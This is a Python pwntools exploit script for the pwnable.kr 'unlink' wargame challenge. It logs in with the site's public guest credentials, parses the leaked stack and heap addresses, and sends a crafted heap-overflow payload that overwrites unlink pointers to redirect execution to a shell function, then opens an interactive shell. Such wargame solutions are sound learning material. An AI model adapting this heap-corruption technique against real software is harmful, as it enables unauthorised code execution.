from pwn import *
import re

destination = 0x80484eb  # Address of shell function

# Setup buffer

distanceToECX = 0xff801fc8 - 4 - 0xff801fb4  # ebp - 4 - A address
distanceToB = 0x093d7428 - 0x93d7418  # B - A buffer

# Setup connection

connection = ssh("unlink", "pwnable.kr", port=2222, password="guest")

# Execute command

proc = connection.process(argv=None, executable="./unlink")
#proc = process(argv=["./unlink"], executable="./unlink")  # Local testing

# Read leaked addresses

regexp = r"0[xX][0-9a-fA-F]+"
address_string = proc.recv(timeout=10)
print address_string

matchObj = re.findall(regexp, address_string, 2)

addressStack = matchObj[0]
addressHeap = matchObj[1]

# Calculate new addresses
addressStack = int(addressStack, 16)
addressHeap = int(addressHeap, 16)

addressStack = addressStack + distanceToECX  # Now contains ebp - 0x4, where we will write

# Address that will contain the destination, pointed to by ECX
addressHeap = addressHeap + distanceToB + (0x93d7430 + 8 - 0x093d7428 + 4)  # Add distance to B buffer and A pointers

print "Placing " + hex(addressHeap) + " at " + hex(addressStack)

# Create input. Overwrite FD, then BK, and then place destination in buffer

Egg = ('A' * distanceToB) + p32(addressHeap) + p32(addressStack) + p32(destination)

#print Egg.encode('hex')

# Send input

proc.sendline(Egg)

# Start interactive shell

proc.interactive()
